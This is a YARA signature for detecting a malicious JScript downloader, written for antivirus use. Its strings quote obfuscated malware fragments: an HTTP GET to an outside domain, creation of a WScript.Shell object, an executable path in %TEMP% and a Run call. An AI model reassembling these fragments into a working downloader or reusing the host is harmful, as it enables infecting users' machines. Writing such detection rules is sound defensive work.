rule sig_20160330_2246c6cec41ee0ec8d773404f7dc2b5c {
  meta:
    description = "datamaliciousorder - file 20160330_2246c6cec41ee0ec8d773404f7dc2b5c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56e35a9372e9849f76db65af03ed3d673f138c2a6907bc30f0d7068d1a36153c"

  strings:
    $s1  = "_W0[_XN](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "var _O = function _DO() {return WScript[_A](\"WScript\"+\".Shell\");}(), _E = 11;" fullword ascii
    $s3  = "function _K(_V, _T0){_OM = _OM * 1; return _V - _T0;};" fullword ascii
    $s4  = "if (_W0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Z() {return _O[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9QUHbgggjriOQp.ex\" + \"e\";};" fullword ascii
    $s6  = "function _SW(){return _K0 + \"\";};" fullword ascii
    $s7  = "function _LK(_LJ){_O[\"Run\"](_LJ, _OM, _OM);};" fullword ascii
    $s8  = "function _RP() {return ((_MY == true) && (_MY == _Z0)) ? 1 : _OM;};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _KK()" fullword ascii
    $s11 = "function _QX(){return 22;};" fullword ascii
    $s12 = "var _SW0 = new this[\"Date\"]();" fullword ascii
    $s13 = "function _X(_PX) {var _KS = (1, 2, 3, 4, 5, _PX); return _KS;};" fullword ascii
    $s14 = "return _K(_N, _SW1);" fullword ascii
    $s15 = "function _EY(){return _A;};" fullword ascii
    $s16 = "var _MY = false;" fullword ascii
    $s17 = "_MY = true; " fullword ascii
    $s18 = "_Z0 = true; " fullword ascii
    $s19 = "var _Z0 = false;" fullword ascii
    $s20 = "var _Y = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}